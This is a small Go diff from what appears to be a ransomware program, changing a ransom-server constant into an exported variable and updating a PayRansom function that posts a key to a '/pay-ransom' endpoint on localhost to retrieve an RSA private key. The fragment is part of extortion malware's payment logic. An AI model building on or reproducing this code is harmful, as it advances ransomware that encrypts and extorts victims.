@@ -83,13 +83,13 @@ type State struct {
 	PublicKey  rsa.PublicKey
 }
 
-const ransomServer = "http://localhost:8081"
+var RansomServer = "http://localhost:8081"
 
 func (s *State) PayRansom() (privateKey *rsa.PrivateKey, err error) {
 	v := make(url.Values)
 	v.Add("key", string(s.PrivateKey))
 	var resp *http.Response
-	resp, err = http.PostForm(ransomServer+"/pay-ransom", v)
+	resp, err = http.PostForm(RansomServer+"/pay-ransom", v)
 	if err != nil {
 		return
 	}
